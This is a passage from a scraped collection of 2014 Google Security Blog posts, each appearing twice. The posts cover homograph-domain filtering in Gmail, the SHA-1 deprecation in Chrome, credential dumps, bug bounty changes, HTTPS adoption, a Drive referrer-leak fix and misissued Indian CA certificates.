letter o, and by mixing and matching them, they can hoodwink unsuspecting victims.* Can you imagine the risk of clicking “ShဝppingSite” vs. “ShoppingSite” or “MyBank” vs. “MyBɑnk”?  To stay one step ahead of spammers, the Unicode community has identified suspicious combinations of letters that could be misleading, and Gmail will now begin rejecting email with such combinations. We’re using an open standard—the Unicode Consortium’s “Highly Restricted” specification—which we believe strikes a healthy balance between legitimate uses of these new domains and those likely to be abused.    We’re rolling out the changes today, and hope that others across the industry will follow suit. Together, we can help ensure that international domains continue to flourish, allowing both users and businesses to have a tête-à-tête in the language of their choosing.  Posted by Mark Risher, Spam & Abuse Team  *For those playing at home, that's a Myanmar letter Wa (U+101D), a Gujarati digit zero (U+AE6) and a Greek small letter omicron (U+03BF), followed by the ASCII letter 'o'.     ", "date": "August 12, 2014"},
{"website": "Google-Security", "title": "\nGradually sunsetting SHA-1\n", "author": [], "link": "https://security.googleblog.com/2014/09/gradually-sunsetting-sha-1.html", "abstract": "                               Cross-posted on the  Chromium Blog         The SHA-1 cryptographic hash algorithm has been known to be considerably weaker than it was designed to be  since at least 2005  &#8212; 9 years ago.  Collision attacks against SHA-1 are too affordable  for us to consider it safe for the public web PKI. We can only expect that attacks will get cheaper.    That&#8217;s why Chrome will start the process of sunsetting SHA-1 (as used in certificate signatures for HTTPS) with Chrome 39 in November. HTTPS sites whose certificate chains use SHA-1 and are valid past 1 January 2017 will no longer appear to be fully trustworthy in Chrome&#8217;s user interface.    SHA-1's use on the Internet has been deprecated since 2011, when the CA/Browser Forum, an industry group of leading web browsers and certificate authorities (CAs) working together to establish basic security requirements for SSL certificates, published their  Baseline Requirements for SSL . These Requirements recommended that all CAs transition away from SHA-1 as soon as possible, and followed similar events in other industries and sectors, such as  NIST  deprecating SHA-1 for government use in 2010.    We have seen this type of weakness turn into a practical attack before, with  the MD5 hash algorithm . We need to ensure that by the time an attack against SHA-1 is demonstrated publicly, the web has already moved away from it. Unfortunately, this can be quite challenging. For example, when Chrome disabled MD5, a number of enterprises, schools, and small businesses were affected when their proxy software &#8212;  from leading vendors  &#8212; continued to use the insecure algorithms, and were left  scrambling for updates . Users who used personal firewall software were also affected.    We plan to surface, in the HTTPS security indicator in Chrome, the fact that SHA-1 does not meet its design guarantee. We are taking a measured approach, gradually ratcheting down the security indicator and gradually moving the timetable up (keep in mind that we release stable versions of Chrome about 6-8 weeks after their branch point):            Chrome 39 (Branch point 26 September 2014)      Sites with end-entity (&#8220;leaf&#8221;) certificates that expire on or after 1 January 2017, and which include a SHA-1-based signature as part of the certificate chain, will be treated as &#8220;secure, but with minor errors&#8221;.     The current visual display for &#8220;secure, but with minor errors&#8221; is a lock with a yellow triangle, and is  used to highlight other deprecated and insecure practices , such as passive mixed content.                  Chrome 40 (Branch point 7 November 2014; Stable after holiday season)      Sites with end-entity certificates that expire between 1 June 2016 to 31 December 2016 (inclusive), and which include a SHA-1-based signature as part of the certificate chain, will be treated as &#8220;secure, but with minor errors&#8221;.      Sites with end-entity certificates that expire on or after 1 January 2017, and which include a SHA-1-based signature as part of the certificate chain, will be treated as &#8220;neutral, lacking security&#8221;.     The current visual display for &#8220;neutral, lacking security&#8221; is a blank page icon, and is used in other situations, such as HTTP.                  Chrome 41 (Branch point in Q1 2015)        Sites with end-entity certificates that expire between 1 January 2016 and 31 December 2016 (inclusive), and which include a SHA-1-based signature as part of the certificate chain, will be treated as &#8220;secure, but with minor errors&#8221;.      Sites with end-entity certificates that expire on or after 1 January 2017, and which include a SHA-1-based signature as part of the certificate chain, will be treated as &#8220;affirmatively insecure&#8221;. Subresources from such domain will be treated as &#8220;active mixed content&#8221;.     The current visual display for &#8220;affirmatively insecure&#8221; is a lock with a red X, and a red strike-through text treatment in the URL scheme.               Note: SHA-1-based signatures for trusted root certificates are not a problem because TLS clients trust them by their identity, rather than by the signature of their hash.             Posted by Chris Palmer, Secure Socket Lover and Ryan Sleevi, Transport Layer Securer                                             Cross-posted on the Chromium Blog   The SHA-1 cryptographic hash algorithm has been known to be considerably weaker than it was designed to be since at least 2005 — 9 years ago. Collision attacks against SHA-1 are too affordable for us to consider it safe for the public web PKI. We can only expect that attacks will get cheaper.  That’s why Chrome will start the process of sunsetting SHA-1 (as used in certificate signatures for HTTPS) with Chrome 39 in November. HTTPS sites whose certificate chains use SHA-1 and are valid past 1 January 2017 will no longer appear to be fully trustworthy in Chrome’s user interface.  SHA-1's use on the Internet has been deprecated since 2011, when the CA/Browser Forum, an industry group of leading web browsers and certificate authorities (CAs) working together to establish basic security requirements for SSL certificates, published their Baseline Requirements for SSL. These Requirements recommended that all CAs transition away from SHA-1 as soon as possible, and followed similar events in other industries and sectors, such as NIST deprecating SHA-1 for government use in 2010.  We have seen this type of weakness turn into a practical attack before, with the MD5 hash algorithm. We need to ensure that by the time an attack against SHA-1 is demonstrated publicly, the web has already moved away from it. Unfortunately, this can be quite challenging. For example, when Chrome disabled MD5, a number of enterprises, schools, and small businesses were affected when their proxy software — from leading vendors — continued to use the insecure algorithms, and were left scrambling for updates. Users who used personal firewall software were also affected.  We plan to surface, in the HTTPS security indicator in Chrome, the fact that SHA-1 does not meet its design guarantee. We are taking a measured approach, gradually ratcheting down the security indicator and gradually moving the timetable up (keep in mind that we release stable versions of Chrome about 6-8 weeks after their branch point):   Chrome 39 (Branch point 26 September 2014)  Sites with end-entity (“leaf”) certificates that expire on or after 1 January 2017, and which include a SHA-1-based signature as part of the certificate chain, will be treated as “secure, but with minor errors”.   The current visual display for “secure, but with minor errors” is a lock with a yellow triangle, and is used to highlight other deprecated and insecure practices, such as passive mixed content.      Chrome 40 (Branch point 7 November 2014; Stable after holiday season)  Sites with end-entity certificates that expire between 1 June 2016 to 31 December 2016 (inclusive), and which include a SHA-1-based signature as part of the certificate chain, will be treated as “secure, but with minor errors”.   Sites with end-entity certificates that expire on or after 1 January 2017, and which include a SHA-1-based signature as part of the certificate chain, will be treated as “neutral, lacking security”.   The current visual display for “neutral, lacking security” is a blank page icon, and is used in other situations, such as HTTP.      Chrome 41 (Branch point in Q1 2015)   Sites with end-entity certificates that expire between 1 January 2016 and 31 December 2016 (inclusive), and which include a SHA-1-based signature as part of the certificate chain, will be treated as “secure, but with minor errors”.   Sites with end-entity certificates that expire on or after 1 January 2017, and which include a SHA-1-based signature as part of the certificate chain, will be treated as “affirmatively insecure”. Subresources from such domain will be treated as “active mixed content”.   The current visual display for “affirmatively insecure” is a lock with a red X, and a red strike-through text treatment in the URL scheme.     Note: SHA-1-based signatures for trusted root certificates are not a problem because TLS clients trust them by their identity, rather than by the signature of their hash.    Posted by Chris Palmer, Secure Socket Lover and Ryan Sleevi, Transport Layer Securer        ", "date": "September 5, 2014"},
{"website": "Google-Security", "title": "\nThat’s not the download you’re looking for...\n", "author": [], "link": "https://security.googleblog.com/2014/08/thats-not-download-youre-looking-for.html", "abstract": "                               Cross-posted on the  Chrome Blog         You should be able to use the web safely, without fear that malware could take control of your computer, or that you could be tricked into giving up personal information in a phishing scam.    That&#8217;s why we&#8217;ve invested so much in tools that protect you online. Our  Safe Browsing  service protects you from malicious websites and warns you about malicious downloads in Chrome. We&#8217;re currently showing more than three million download warnings per week&#8212;and because we make this technology available for other browsers to use, we can help keep 1.1 billion people safe.    Starting next week, we&#8217;ll be expanding Safe Browsing protection against additional kinds of deceptive software: programs disguised as a helpful download that actually make unexpected changes to your computer&#8212;for instance, switching your homepage or other browser settings to ones you don&#8217;t want.    We&#8217;ll show a warning in Chrome whenever an attempt is made to trick you into downloading and installing such software. (If you still wish to proceed despite the warning, you can access it from your Downloads list.) &nbsp;              As always, be careful and make sure you trust the source when downloading software. Check out  these tips  to learn how you can stay safe on the web.         Posted by Moheeb Abu Rajab, Staff Engineer, Google Security                                         Cross-posted on the Chrome Blog   You should be able to use the web safely, without fear that malware could take control of your computer, or that you could be tricked into giving up personal information in a phishing scam.  That’s why we’ve invested so much in tools that protect you online. Our Safe Browsing service protects you from malicious websites and warns you about malicious downloads in Chrome. We’re currently showing more than three million download warnings per week—and because we make this technology available for other browsers to use, we can help keep 1.1 billion people safe.  Starting next week, we’ll be expanding Safe Browsing protection against additional kinds of deceptive software: programs disguised as a helpful download that actually make unexpected changes to your computer—for instance, switching your homepage or other browser settings to ones you don’t want.  We’ll show a warning in Chrome whenever an attempt is made to trick you into downloading and installing such software. (If you still wish to proceed despite the warning, you can access it from your Downloads list.)      As always, be careful and make sure you trust the source when downloading software. Check out these tips to learn how you can stay safe on the web.    Posted by Moheeb Abu Rajab, Staff Engineer, Google Security      ", "date": "August 14, 2014"},
{"website": "Google-Security", "title": "\nCleaning up after password dumps\n", "author": [], "link": "https://security.googleblog.com/2014/09/cleaning-up-after-password-dumps.html", "abstract": "                            One of the unfortunate realities of the Internet today is a phenomenon known in security circles as &#8220;credential dumps&#8221;&#8212;the posting of lists of usernames and passwords on the web. We&#8217;re always monitoring for these dumps so we can respond quickly to protect our users. This week, we identified several lists claiming to contain Google and other Internet providers&#8217; credentials.    We found that less than 2% of the username and password combinations might have worked, and our  automated anti-hijacking systems  would have blocked many of those login attempts. We&#8217;ve protected the affected accounts and have required those users to reset their passwords.         It&#8217;s important to note that in this case and in others, the leaked usernames and passwords were not the result of a breach of Google systems. Often, these credentials are obtained through a combination of other sources.&nbsp;     For instance, if you reuse the same username and password across websites, and one of those websites gets hacked, your credentials could be used to log into the others. Or attackers can use  malware  or  phishing  schemes to capture login credentials.  We&#8217;re constantly working to keep your accounts secure from phishing, malware and spam. For instance, if we see unusual account activity, we&#8217;ll stop sign-in attempts from unfamiliar locations and devices. You can  review this activity  and confirm whether or not you actually took the action.  A few final tips: Make sure you&#8217;re using a  strong password  unique to Google. Update your  recovery options  so we can reach you by phone or email if you get locked out of your account. And consider  2-step verification , which adds an extra layer of security to your account. You can visit  g.co/accountcheckup  where you&#8217;ll see a list of many of the security controls at your disposal.   Posted by Borbala Benko, Elie Bursztein, Tadek Pietraszek and Mark Risher, Google Spam &amp; Abuse Team                                      One of the unfortunate realities of the Internet today is a phenomenon known in security circles as “credential dumps”—the posting of lists of usernames and passwords on the web. We’re always monitoring for these dumps so we can respond quickly to protect our users. This week, we identified several lists claiming to contain Google and other Internet providers’ credentials. We found that less than 2% of the username and password combinations might have worked, and our automated anti-hijacking systems would have blocked many of those login attempts. We’ve protected the affected accounts and have required those users to reset their passwords.    It’s important to note that in this case and in others, the leaked usernames and passwords were not the result of a breach of Google systems. Often, these credentials are obtained through a combination of other sources.   For instance, if you reuse the same username and password across websites, and one of those websites gets hacked, your credentials could be used to log into the others. Or attackers can use malware or phishing schemes to capture login credentials.We’re constantly working to keep your accounts secure from phishing, malware and spam. For instance, if we see unusual account activity, we’ll stop sign-in attempts from unfamiliar locations and devices. You can review this activity and confirm whether or not you actually took the action.A few final tips: Make sure you’re using a strong password unique to Google. Update your recovery options so we can reach you by phone or email if you get locked out of your account. And consider 2-step verification, which adds an extra layer of security to your account. You can visit g.co/accountcheckup where you’ll see a list of many of the security controls at your disposal.Posted by Borbala Benko, Elie Bursztein, Tadek Pietraszek and Mark Risher, Google Spam & Abuse Team     ", "date": "September 10, 2014"},
{"website": "Google-Security", "title": "\nSecurity for the people\n", "author": [], "link": "https://security.googleblog.com/2014/09/security-for-people.html", "abstract": "                             Cross-posted on the  Open Source Blog         A  recent Pew study  found that 86% of people surveyed had taken steps to protect their security online. This is great&#8212;more security is always good. However, if people are indeed working to protect themselves, why are we still seeing incidents, breaches, and confusion? In many cases these problems recur because the technology that allows people to secure their communications, content and online activity is too hard to use.&nbsp;       In other words, the tools for the job exist. But while many of these tools work technically, they don&#8217;t always work in ways that users expect. They introduce extra steps or are simply confusing and cumbersome. (&#8220;Is this a software bug, or am I doing something wrong?&#8221;) However elegant and intelligent the underlying technology (and much of it is truly miraculous), the results are in: if people can&#8217;t use it easily, many of them won&#8217;t.&nbsp;         We believe that people shouldn&#8217;t have to make a trade-off between security and ease of use. This is why we&#8217;re happy to support  Simply Secure , a new organization dedicated to improving the usability and safety of open-source tools that help people secure their online lives.&nbsp;         Over the coming months, Simply Secure will be collaborating with open-source developers, designers, researchers, and others to take what&#8217;s there&#8212;groundbreaking work from efforts like  Open Whisper Systems ,  The Guardian Project ,  Off-the-Record Messaging , and more&#8212;and work to make them easier to understand and use.&nbsp;         We&#8217;re excited for a future where people won&#8217;t have to choose between ease and security, and where tools that allow people to secure their communications, content, and online activity are as easy as choosing to use them.   Posted by Meredith Whittaker, Open Source Research Lead and Ben Laurie, Senior Staff Security Engineer                                        Cross-posted on the Open Source Blog   A recent Pew study found that 86% of people surveyed had taken steps to protect their security online. This is great—more security is always good. However, if people are indeed working to protect themselves, why are we still seeing incidents, breaches, and confusion? In many cases these problems recur because the technology that allows people to secure their communications, content and online activity is too hard to use.    In other words, the tools for the job exist. But while many of these tools work technically, they don’t always work in ways that users expect. They introduce extra steps or are simply confusing and cumbersome. (“Is this a software bug, or am I doing something wrong?”) However elegant and intelligent the underlying technology (and much of it is truly miraculous), the results are in: if people can’t use it easily, many of them won’t.     We believe that people shouldn’t have to make a trade-off between security and ease of use. This is why we’re happy to support Simply Secure, a new organization dedicated to improving the usability and safety of open-source tools that help people secure their online lives.     Over the coming months, Simply Secure will be collaborating with open-source developers, designers, researchers, and others to take what’s there—groundbreaking work from efforts like Open Whisper Systems, The Guardian Project, Off-the-Record Messaging, and more—and work to make them easier to understand and use.     We’re excited for a future where people won’t have to choose between ease and security, and where tools that allow people to secure their communications, content, and online activity are as easy as choosing to use them.Posted by Meredith Whittaker, Open Source Research Lead and Ben Laurie, Senior Staff Security Engineer      ", "date": "September 18, 2014"},
{"website": "Google-Security", "title": "\nFewer bugs, mo’ money\n", "author": [], "link": "https://security.googleblog.com/2014/09/fewer-bugs-mo-money.html", "abstract": "                               Cross-posted on the  Chromium Blog         We work hard to keep you safe online. In Chrome, for instance, we warn users against malware and phishing and offer rewards for finding security bugs. Due in part to our collaboration with the research community, we&#8217;ve squashed more than 700 Chrome security bugs and have rewarded more than $1.25 million through our&nbsp; bug reward program . But as Chrome has become more&nbsp; secure , it&#8217;s gotten even harder to find and exploit security bugs.         This is a good problem to have! In recognition of the extra effort it takes to uncover vulnerabilities in Chrome, we&#8217;re increasing our reward levels. We&#8217;re also making some changes to be more transparent with researchers reporting a bug.           First, we&#8217;re increasing our usual reward pricing range to $500-$15,000 per bug, up from a previous published maximum of $5,000. This is accompanied with  a clear breakdown of likely reward amounts  by bug type. As always, we reserve the right to reward above these levels for particularly great reports. (For example,  last month  we awarded $30,000 for a very impressive report.)         Second, we&#8217;ll pay at the higher end of the range when researchers can provide an exploit to demonstrate a specific attack path against our users. Researchers now have an option to submit the vulnerability first and follow up with an exploit later. We believe that this a win-win situation for security and researchers: we get to patch bugs earlier and our contributors get to lay claim to the bugs sooner, lowering the chances of submitting a duplicate report.         Third, Chrome reward recipients will be listed in the  Google Hall of Fame , so you&#8217;ve got something to print out and hang on the fridge.         As a special treat, we&#8217;re going to back-pay valid submissions from July 1, 2014 at the increased reward levels we&#8217;re announcing today. Good times.         We&#8217;ve also  answered some new FAQs  on our rules page, including questions about our new Trusted Researcher program and a bit about our philosophy and alternative markets for zero-day bugs.         Happy bug hunting!          Posted by Tim Willis, Hacker Philanthropist, Chrome Security Team                                           Cross-posted on the Chromium Blog   We work hard to keep you safe online. In Chrome, for instance, we warn users against malware and phishing and offer rewards for finding security bugs. Due in part to our collaboration with the research community, we’ve squashed more than 700 Chrome security bugs and have rewarded more than $1.25 million through our bug reward program. But as Chrome has become more secure, it’s gotten even harder to find and exploit security bugs.    This is a good problem to have! In recognition of the extra effort it takes to uncover vulnerabilities in Chrome, we’re increasing our reward levels. We’re also making some changes to be more transparent with researchers reporting a bug.     First, we’re increasing our usual reward pricing range to $500-$15,000 per bug, up from a previous published maximum of $5,000. This is accompanied with a clear breakdown of likely reward amounts by bug type. As always, we reserve the right to reward above these levels for particularly great reports. (For example, last month we awarded $30,000 for a very impressive report.)    Second, we’ll pay at the higher end of the range when researchers can provide an exploit to demonstrate a specific attack path against our users. Researchers now have an option to submit the vulnerability first and follow up with an exploit later. We believe that this a win-win situation for security and researchers: we get to patch bugs earlier and our contributors get to lay claim to the bugs sooner, lowering the chances of submitting a duplicate report.    Third, Chrome reward recipients will be listed in the Google Hall of Fame, so you’ve got something to print out and hang on the fridge.    As a special treat, we’re going to back-pay valid submissions from July 1, 2014 at the increased reward levels we’re announcing today. Good times.    We’ve also answered some new FAQs on our rules page, including questions about our new Trusted Researcher program and a bit about our philosophy and alternative markets for zero-day bugs.    Happy bug hunting!    Posted by Tim Willis, Hacker Philanthropist, Chrome Security Team       ", "date": "September 30, 2014"},
{"website": "Google-Security", "title": "\nAn update to SafeSearch options for network administrators\n", "author": [], "link": "https://security.googleblog.com/2014/10/an-update-to-safesearch-options-for.html", "abstract": "                            Security and privacy are top priorities for Google. We&#8217;ve invested a lot in making our products secure, including  strong SSL encryption  by default for Search, Gmail and Drive. We&#8217;re working to further extend encryption across all our services, ensuring that your connection to Google is private.         For some time, we&#8217;ve offered network administrators the ability to require the use of SafeSearch by their users, which filters out explicit content from search results; this is especially important for schools. However, using this functionality has meant that searches were sent over an unencrypted connection to Google. Unfortunately, this has been the target of abuse by other groups looking to snoop on people&#8217;s searches, so we will be removing it as of early December.         Going forward, organizations can require SafeSearch on their networks while at the same time ensuring that their users&#8217; connections to Google remain encrypted. (This is in addition to existing functionality that allows SafeSearch to be set on individual browsers and to be enabled by policy on  managed devices  like Chromebooks.) Network administrators can read more about how to enable this new feature  here .          Posted by Brian Fitzpatrick, Engineering Director                                      Security and privacy are top priorities for Google. We’ve invested a lot in making our products secure, including strong SSL encryption by default for Search, Gmail and Drive. We’re working to further extend encryption across all our services, ensuring that your connection to Google is private.    For some time, we’ve offered network administrators the ability to require the use of SafeSearch by their users, which filters out explicit content from search results; this is especially important for schools. However, using this functionality has meant that searches were sent over an unencrypted connection to Google. Unfortunately, this has been the target of abuse by other groups looking to snoop on people’s searches, so we will be removing it as of early December.    Going forward, organizations can require SafeSearch on their networks while at the same time ensuring that their users’ connections to Google remain encrypted. (This is in addition to existing functionality that allows SafeSearch to be set on individual browsers and to be enabled by policy on managed devices like Chromebooks.) Network administrators can read more about how to enable this new feature here.    Posted by Brian Fitzpatrick, Engineering Director     ", "date": "October 2, 2014"},
{"website": "Google-Security", "title": "\nHTTPS as a ranking signal\n", "author": [], "link": "https://security.googleblog.com/2014/08/https-as-ranking-signal_6.html", "abstract": "                               Cross-posted from the  Webmaster Central Blog           Security is a top priority for Google. We invest a lot in making sure that our services use industry-leading security, like  strong HTTPS encryption by default . That means that people using Search, Gmail and Drive, for example, automatically have a secure connection to Google.&nbsp;              Beyond our own stuff, we&#8217;re also working to make the Internet safer more broadly. A big part of that is making sure that websites people access from Google are secure. For instance, we have created resources to help webmasters  prevent and fix security breaches  on their sites.&nbsp;             We want to go even further. At  Google I/O  a few months ago, we called for &#8220; HTTPS everywhere &#8221; on the web.&nbsp;         We&#8217;ve also seen more and more webmasters adopting  HTTPS  (also known as HTTP over  TLS , or Transport Layer Security), on their website, which is encouraging.&nbsp;         For these reasons, over the past few months we&#8217;ve been running tests taking into account whether sites use secure, encrypted connections as a signal in our search ranking algorithms. We&#8217;ve seen positive results, so we&#8217;re starting to use HTTPS as a ranking signal. For now it's only a very lightweight signal&#8212;affecting fewer than 1% of global queries, and carrying less weight than other signals such as&nbsp; high-quality content &#8212;while we give webmasters time to switch to HTTPS. But over time, we may decide&nbsp;to strengthen it, because we&#8217;d like to encourage all website owners to switch from HTTP to HTTPS to keep everyone safe on the web.         In the coming weeks, we&#8217;ll publish detailed best practices (we&#8217;ll add a link to it from here) to make TLS adoption easier, and to avoid common mistakes. Here are some basic tips to get started:       Decide the kind of certificate you need: single, multi-domain, or wildcard certificate   Use 2048-bit key certificates   Use relative URLs for resources that reside on the same secure domain   Use protocol relative URLs for all other domains   Check out our  Site move article  for more guidelines on how to change your website&#8217;s address   Don&#8217;t block your HTTPS site from crawling using robots.txt   Allow indexing of your pages by search engines where possible. Avoid the noindex robots meta tag         If your website is already serving on HTTPS, you can test its security level and configuration with the  Qualys Lab tool . If you are concerned about TLS and your site&#8217;s performance, have a look at  Is TLS fast yet? . And of course, if you have any questions or concerns, please feel free to post in our  Webmaster Help Forums .         We hope to see more websites using HTTPS in the future. Let&#8217;s all make the web more secure!       Posted by   Zineb Ait Bahajji   and   Gary Illyes  , Webmaster Trends Analysts                                       Cross-posted from the Webmaster Central Blog    Security is a top priority for Google. We invest a lot in making sure that our services use industry-leading security, like strong HTTPS encryption by default. That means that people using Search, Gmail and Drive, for example, automatically have a secure connection to Google.      Beyond our own stuff, we’re also working to make the Internet safer more broadly. A big part of that is making sure that websites people access from Google are secure. For instance, we have created resources to help webmasters prevent and fix security breaches on their sites.       We want to go even further. At Google I/O a few months ago, we called for “HTTPS everywhere” on the web.     We’ve also seen more and more webmasters adopting HTTPS (also known as HTTP over TLS, or Transport Layer Security), on their website, which is encouraging.     For these reasons, over the past few months we’ve been running tests taking into account whether sites use secure, encrypted connections as a signal in our search ranking algorithms. We’ve seen positive results, so we’re starting to use HTTPS as a ranking signal. For now it's only a very lightweight signal—affecting fewer than 1% of global queries, and carrying less weight than other signals such as high-quality content—while we give webmasters time to switch to HTTPS. But over time, we may decide to strengthen it, because we’d like to encourage all website owners to switch from HTTP to HTTPS to keep everyone safe on the web.    In the coming weeks, we’ll publish detailed best practices (we’ll add a link to it from here) to make TLS adoption easier, and to avoid common mistakes. Here are some basic tips to get started:   Decide the kind of certificate you need: single, multi-domain, or wildcard certificate Use 2048-bit key certificates Use relative URLs for resources that reside on the same secure domain Use protocol relative URLs for all other domains Check out our Site move article for more guidelines on how to change your website’s address Don’t block your HTTPS site from crawling using robots.txt Allow indexing of your pages by search engines where possible. Avoid the noindex robots meta tag    If your website is already serving on HTTPS, you can test its security level and configuration with the Qualys Lab tool. If you are concerned about TLS and your site’s performance, have a look at Is TLS fast yet?. And of course, if you have any questions or concerns, please feel free to post in our Webmaster Help Forums.    We hope to see more websites using HTTPS in the future. Let’s all make the web more secure!  Posted by Zineb Ait Bahajji and Gary Illyes, Webmaster Trends Analysts     ", "date": "August 6, 2014"},
{"website": "Google-Security", "title": "\nSee what your apps & extensions have been up to\n", "author": [], "link": "https://security.googleblog.com/2014/06/see-what-your-apps-extensions-have-been.html", "abstract": "                                  Cross-posted from the  Chromium Blog            Extensions are a great way to enhance the browsing experience. However, some extensions ask for broad permissions that allow access to sensitive data such as browser cookies or history. Last year, we  introduced  the  Chrome Apps &amp; Extensions Developer Tool , which provides an improved developer experience for debugging apps and extensions. The newest version of the tool, available today, lets power users audit any app or extension and get visibility into the precise actions that it's performing.             Once you&#8217;ve installed the Chrome Apps &amp; Extensions Developer Tool, it will start locally auditing your extensions and apps as you use them. For each app or extension, you can see historical activity over the past few days as well as real-time activity by clicking the &#8220;Behavior&#8221; link. The tool highlights activities that involve your information, such as reading website cookies or modifying web sites, in a privacy section. You can also search for URLs to see if an extension has modified any matching pages. If you&#8217;re debugging an app or extension, you can use the &#8220;Realtime&#8221; tab to watch the stream of API calls as an extension or app runs. This can help you track down glitches or identify unnecessary API calls.    Whether you&#8217;re a Chrome power user or a developer testing an extension, the Chrome Apps &amp; Extensions Developer Tool can give you the information you need to understand how apps and extensions affect your browsing.    Posted by Adrienne Porter Felt, Software Engineer and Extension Tinkerer                                           Cross-posted from the Chromium Blog    Extensions are a great way to enhance the browsing experience. However, some extensions ask for broad permissions that allow access to sensitive data such as browser cookies or history. Last year, we introduced the Chrome Apps & Extensions Developer Tool, which provides an improved developer experience for debugging apps and extensions. The newest version of the tool, available today, lets power users audit any app or extension and get visibility into the precise actions that it's performing.     Once you’ve installed the Chrome Apps & Extensions Developer Tool, it will start locally auditing your extensions and apps as you use them. For each app or extension, you can see historical activity over the past few days as well as real-time activity by clicking the “Behavior” link. The tool highlights activities that involve your information, such as reading website cookies or modifying web sites, in a privacy section. You can also search for URLs to see if an extension has modified any matching pages. If you’re debugging an app or extension, you can use the “Realtime” tab to watch the stream of API calls as an extension or app runs. This can help you track down glitches or identify unnecessary API calls.  Whether you’re a Chrome power user or a developer testing an extension, the Chrome Apps & Extensions Developer Tool can give you the information you need to understand how apps and extensions affect your browsing.  Posted by Adrienne Porter Felt, Software Engineer and Extension Tinkerer        ", "date": "June 10, 2014"},
{"website": "Google-Security", "title": "\nGoogle Drive update to protect to shared links\n", "author": [], "link": "https://security.googleblog.com/2014/06/google-drive-update-to-protect-to.html", "abstract": "                             Posted by Kevin Stadmeyer, Technical Program Manager        At Google, ensuring the security of our users is a top priority, and we are constantly assessing how we can make our services even more secure. We recently received a report via our  Vulnerability Reward Program  of a security issue affecting a small subset of file types in Google Drive and have since made an update to address it.  This issue is only relevant if  all  of the following apply:    The file was uploaded to Google Drive   The file was   not   converted to Docs, Sheets, or Slides (i.e. remained in its original format such as .pdf, .docx, etc.)   The owner changed sharing settings so that the document was available to &#8220;Anyone with the link&#8221;   The file contained hyperlinks to third-party   HTTPS   websites in its content    In this specific instance, if a user clicked on the embedded hyperlink, the administrator of that third-party site could potentially receive header information that may have allowed him or her to see the URL of the original document that linked to his or her site.  Today&#8217;s update to Drive takes extra precaution by ensuring that newly shared documents with hyperlinks to third-party HTTPS websites will not inadvertently relay the original document&#8217;s URL.  While any documents shared going forward are no longer impacted by this issue, if one of your previously shared documents meets all four of the criteria above, you can generate a new sharing link with the following steps:    Create a copy of the document, via File &gt; \"Make a copy...\"   Share the copy of the document with particular people or via a new shareable link, via the &#8220;Share&#8221; button   Delete the original document                                         Posted by Kevin Stadmeyer, Technical Program Manager   At Google, ensuring the security of our users is a top priority, and we are constantly assessing how we can make our services even more secure. We recently received a report via our Vulnerability Reward Program of a security issue affecting a small subset of file types in Google Drive and have since made an update to address it.This issue is only relevant if all of the following apply: The file was uploaded to Google Drive The file was not converted to Docs, Sheets, or Slides (i.e. remained in its original format such as .pdf, .docx, etc.) The owner changed sharing settings so that the document was available to “Anyone with the link” The file contained hyperlinks to third-party HTTPS websites in its content  In this specific instance, if a user clicked on the embedded hyperlink, the administrator of that third-party site could potentially receive header information that may have allowed him or her to see the URL of the original document that linked to his or her site.Today’s update to Drive takes extra precaution by ensuring that newly shared documents with hyperlinks to third-party HTTPS websites will not inadvertently relay the original document’s URL.While any documents shared going forward are no longer impacted by this issue, if one of your previously shared documents meets all four of the criteria above, you can generate a new sharing link with the following steps: Create a copy of the document, via File > \"Make a copy...\" Share the copy of the document with particular people or via a new shareable link, via the “Share” button Delete the original document       ", "date": "June 27, 2014"},
{"website": "Google-Security", "title": "\nMaintaining digital certificate security\n", "author": [], "link": "https://security.googleblog.com/2014/07/maintaining-digital-certificate-security.html", "abstract": "                             Posted by Adam Langley, Security Engineer          On Wednesday, July 2, we became aware of unauthorized digital certificates for several Google domains. The certificates were issued by the  National Informatics Centre  (NIC) of India, which holds several intermediate CA certificates trusted by the  Indian Controller of Certifying Authorities  (India CCA).         The India CCA certificates are  included in the Microsoft Root Store  and thus are trusted by the vast majority of programs running on Windows, including Internet Explorer and Chrome. Firefox is not affected because it uses its own root store that doesn&#8217;t include these certificates.         We are not aware of any other root stores that include the India CCA certificates, thus Chrome on other operating systems, Chrome OS, Android, iOS and OS X are not affected. Additionally, Chrome on Windows would not have accepted the certificates for Google sites because of  public-key pinning , although misissued certificates for other sites may exist.         We promptly alerted NIC, India CCA and Microsoft about the incident, and we blocked the misissued certificates in Chrome with a  CRLSet  push.    On July 3, India CCA informed us that they revoked all the NIC intermediate certificates, and another CRLSet push was performed to include that revocation.         Chrome users do not need to take any action to be protected by the CRLSet updates. We have no indication of widespread abuse and we are not suggesting that people change passwords.         At this time, India CCA is still investigating this incident. This event also highlights, again, that our  Certificate Transparency  project is critical for protecting the security of certificates in the future.          Update Jul 9: &nbsp;India CCA informed us of the results of their investigation on July 8. They reported that NIC&#8217;s issuance process was compromised and that only four certificates were misissued; the first on June 25. The four certificates provided included three for Google domains (one of which we were previously aware of) and one for Yahoo domains. However, we are also aware of misissued certificates not included in that set of four and can only conclude that the scope of the breach is unknown.        The intermediate CA certificates held by NIC were revoked on July 3, as noted above. But a root CA is responsible for all certificates issued under its authority. In light of this, in a future Chrome release, we will limit the India CCA root certificate to the following domains and subdomains thereof in order to protect users:        gov.in       nic.in       ac.in       rbi.org.in       bankofindia.co.in       ncode.in       tcs.co.in                                                   Posted by Adam Langley, Security Engineer    On Wednesday, July 2, we became aware of unauthorized digital certificates for several Google domains. The certificates were issued by the National Informatics Centre (NIC) of India, which holds several intermediate CA certificates trusted by the Indian Controller of Certifying Authorities (India CCA).    The India CCA certificates are included in the Microsoft Root Store and thus are trusted by the vast majority of programs running on Windows, including Internet Explorer and Chrome. Firefox is not affected because it uses its own root store that doesn’t include these certificates.    We are not aware of any other root stores that include the India CCA certificates, thus Chrome on other operating systems, Chrome OS, Android, iOS and OS X are not affected. Additionally, Chrome on Windows would not have accepted the certificates for Google sites because of public-key pinning, although misissued certificates for other sites may exist.    We promptly alerted NIC, India CCA and Microsoft about the incident, and we blocked the misissued certificates in Chrome with a CRLSet push.  On July 3, India CCA informed us that they revoked all the NIC intermediate certificates, and another CRLSet push was performed to include that revocation.    Chrome users do not need to take any action to be protected by the CRLSet updates. We have no indication of widespread abuse and we are not suggesting that people change passwords.    At this time, India CCA is still investigating this incident. This event also highlights, again, that our Certificate Transparency project is critical for protecting the security of certificates in the future.  Update Jul 9: India CCA informed us of the results of their investigation on July 8. They reported that NIC’s issuance process was compromised and that only four certificates were misissued; the first on June 25. The four certificates provided included three for Google domains (one of which we were previously aware of) and one for Yahoo domains. However, we are also aware of misissued certificates not included in that set of four and can only conclude that the scope of the 